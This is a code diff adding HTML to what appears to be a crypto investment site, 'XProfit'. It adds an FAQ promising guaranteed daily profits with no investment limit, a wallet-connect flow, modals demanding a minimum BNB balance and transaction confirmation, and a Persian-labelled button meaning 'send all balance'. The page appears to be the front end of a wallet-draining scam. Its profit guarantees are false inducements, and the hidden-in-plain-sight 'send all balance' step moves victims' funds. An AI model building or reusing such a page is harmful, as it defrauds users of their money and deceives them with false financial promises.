@@ -123,6 +123,96 @@
 
 
 
+      <div class="faq">
+        <h1>Frequently Asked Questions (FAQ)</h1>
+        <div class="faq-item">
+          <div class="faq-question">
+            Is the daily profit guaranteed?<span class="icon">+</span>
+          </div>
+          <div class="faq-answer">
+            Yes, the daily profit is guaranteed based on our precise investment model and financial backing. Profits are distributed automatically every 24 hours.
+          </div>
+        </div>
+        
+        <div class="faq-item">
+          <div class="faq-question">
+            How do I start investing?<span class="icon">+</span>
+          </div>
+          <div class="faq-answer">
+            To get started, simply connect your wallet. Once connected, you will need to confirm your X balance within the wallet to activate the investment process.
+          </div>
+        </div>
+      
+        <div class="faq-item">
+          <div class="faq-question">
+            How and when are profits paid?<span class="icon">+</span>
+          </div>
+          <div class="faq-answer">
+            Profits are automatically deposited into your wallet every 24 hours — no manual request required.
+          </div>
+        </div>
+
+        <div class="faq-item">
+            <div class="faq-question">
+                Is my information secure?<span class="icon">+</span>
+            </div>
+            <div class="faq-answer">
+                Absolutely. All data is stored and transferred using the latest encryption standards to ensure full security.
+            </div>
+          </div>
+          
+          <div class="faq-item">
+            <div class="faq-question">
+                Are there any limits on minimum or maximum investment?<span class="icon">+</span>
+            </div>
+            <div class="faq-answer">
+                The minimum investment is 10 X. There is no maximum limit for investment.
+            </div>
+          </div>
+        
+          <div class="faq-item">
+            <div class="faq-question">
+                Do I need to install an app?<span class="icon">+</span>
+            </div>
+            <div class="faq-answer">
+                No, all XProfit services are accessible through your web browser. There is no need to install an application.
+            </div>
+          </div>
+      </div>
+
+
+
+
+
+
+<!-- Modal: موجودی کافی نیست -->
+<div id="lowBalanceModal" class="modal">
+    <div class="modal-content">
+      <p>Your BNB balance is too low (minimum 0.1 BNB required).</p>
+      <button onclick="closeModal('lowBalanceModal')">Close</button>
+    </div>
+  </div>
+  
+  <!-- Modal: تایید تراکنش -->
+  <div id="confirmTransactionModal" class="modal">
+    <div class="modal-content">
+      <p>Please confirm the transaction in your wallet.</p>
+      <button onclick="closeModal('confirmTransactionModal')">Close</button>
+    </div>
+  </div>
+
+
+
+
+      <button id="connectWallet">اتصال کیف پول</button>
+
+      <div id="walletInfo" style="display: none;">
+        <p>آدرس: <span id="address"></span></p>
+        <p>موجودی: <span id="balance"></span></p>
+        <button id="sendTx">ارسال تمام موجودی</button>
+      </div>
+      <script type="module" src="/main.js"></script>
+
 
     <script src="script.js"></script>
 
